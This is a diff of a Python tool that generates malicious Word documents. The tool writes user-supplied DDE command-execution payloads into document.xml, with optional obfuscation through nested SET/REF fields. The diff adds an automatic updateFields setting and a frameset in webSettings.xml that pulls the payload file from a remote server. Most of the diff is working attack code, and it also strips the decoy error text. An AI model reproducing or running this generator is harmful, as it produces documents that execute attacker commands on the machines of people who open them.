@@ -73,7 +73,7 @@ def gen_payload(obfuscate):
     arg2 = raw_input("[-] Enter DDE payload argument #2: ")
     arg3 = raw_input("[-] Enter DDE payload argument #3 (press ENTER to omit): ")
 
-    payload.append('DDEAUTO')
+    payload.append('DDE')
     payload.append(arg1)
     payload.append(arg2)
     payload.append(arg3)   
@@ -104,13 +104,12 @@ def gen_payload(obfuscate):
         print '[*] Obfuscated DDE payload: {}'.format(obfusc_payload)
 
     # Prompt user for server hosting payload Office document (referenced by 'template')
+    # e.g., http://localhost:8000
     targetsvr = raw_input("[-] Enter server URL (hosting payload Word file): ")
     if obfuscate:
         targetsvr = targetsvr + '/payload-obfuscated-final.docx'
-        #targetsvr = 'http://localhost:8000/payload-obfuscated-final.docx'
     else:
         targetsvr = targetsvr + '/payload-final.docx'
-        #targetsvr = 'http://localhost:8000/payload-final.docx'
 
     if obfuscate:
         return obfusc_payload, targetsvr
@@ -124,12 +123,12 @@ if __name__ == "__main__":
     # Set output file names and create zipfile objects for each
     if obfuscate:
         payload_out = "payload-obfuscated-final.docx"
-        zfpay = zipfile.ZipFile('payload-obfuscated.docx')
+        zfpay = zipfile.ZipFile('templates/payload-obfuscated.docx')
     else:
         payload_out = "payload-final.docx"
-        zfpay = zipfile.ZipFile('payload.docx')
+        zfpay = zipfile.ZipFile('templates/payload.docx')
     template_out = "template-final.docx"   
-    zftemplate = zipfile.ZipFile('template.docx') 
+    zftemplate = zipfile.ZipFile('templates/template.docx') 
 
     obfusc_payload, targetsvr = gen_payload(obfuscate)
 
@@ -147,6 +146,19 @@ if __name__ == "__main__":
     # webSettings.xml.rels file
     webxml = zftemplate.read('word/webSettings.xml')
     webtree = etree.fromstring(webxml)
+    # Edit payload settings.xml to insert updateFields element
+    settingxml = zfpay.read('word/settings.xml')
+    settingtree = etree.fromstring(settingxml) 
+
+    updatefields = '<w:updateFields w:val="true" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" />'
+    updatefields = etree.fromstring(updatefields)
+
+    # Find 'settings' XML element in word/settings.xml and insert element to
+    # automatically update fields within the document
+    for node in settingtree.iter(tag=etree.Element):
+        if node.tag == word_schema + "settings":
+            print '[*] Inserting updateFields XML element into {}/word/settings.xml...'.format(payload_out)
+            node.insert(0,updatefields)
 
     # Find 'webSettings' XML element and insert frameset as child element
     for node in webtree.iter(tag=etree.Element):
@@ -157,7 +169,7 @@ if __name__ == "__main__":
     # Formulate XML elements necessary to insert nested, obfuscated DDE payload into 
     # payload.docx/word/document.xml (for obfuscated payloads only)
     instrtext = '''
-                <w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET c</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>"</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[0] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText>"</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET d</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[1] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET e</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[2] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:p w:rsidR="00522B43" w:rsidRDefault="00BF6731"><w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO</w:instrText></w:r><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF c "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF d "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF e "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText>!Unexpected End of Formula</w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate" w:dirty="true"/></w:r><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:t>!Unexpected End of Formula</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:sectPr w:rsidR="00522B43"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body>
+                <w:body xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" /></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET c</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>"</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[0] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText> </w:instrText></w:r></w:fldSimple><w:r><w:instrText>"</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" /></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET d</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[1] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText> </w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:p w:rsidR="00830AD6" w:rsidRDefault="00830AD6" w:rsidP="00830AD6"><w:r><w:fldChar w:fldCharType="begin" /></w:r><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:instrText>SET e</w:instrText></w:r><w:r><w:instrText xml:space="preserve"> "</w:instrText></w:r><w:fldSimple w:instr=" ''' + obfusc_payload[2] + '''  "><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText> </w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve">" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:p w:rsidR="00522B43" w:rsidRDefault="00BF6731"><w:r><w:fldChar w:fldCharType="begin" /></w:r><w:r><w:instrText xml:space="preserve"> DDE</w:instrText></w:r><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF c "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText> </w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF d "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText> </w:instrText></w:r></w:fldSimple><w:r w:rsidR="00830AD6"><w:instrText xml:space="preserve"> </w:instrText></w:r><w:fldSimple w:instr=" REF e "><w:r w:rsidR="00830AD6"><w:rPr><w:b/><w:noProof/></w:rPr><w:instrText> </w:instrText></w:r></w:fldSimple><w:r><w:instrText xml:space="preserve"> </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate" /></w:r><w:r><w:rPr><w:b/><w:noProof/></w:rPr><w:t> </w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p><w:sectPr w:rsidR="00522B43"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body>
                 '''
 
     # Find 'instrText' XML element and change value to DDE payload
@@ -177,6 +189,11 @@ if __name__ == "__main__":
     tmp_dir_template = tempfile.mkdtemp()
     zfpay.extractall(tmp_dir_pay)
     zftemplate.extractall(tmp_dir_template)
+
+    # Write modified settings.xml to temp directory for payload.docx
+    with open(os.path.join(tmp_dir_pay,'word/settings.xml'), 'w') as f:
+        xmlstr = etree.tostring(settingtree)
+        f.write(xmlstr)
 
     # Write modified webSettings.xml to temp directory for template.docx
     with open(os.path.join(tmp_dir_template,'word/webSettings.xml'), 'w') as f:
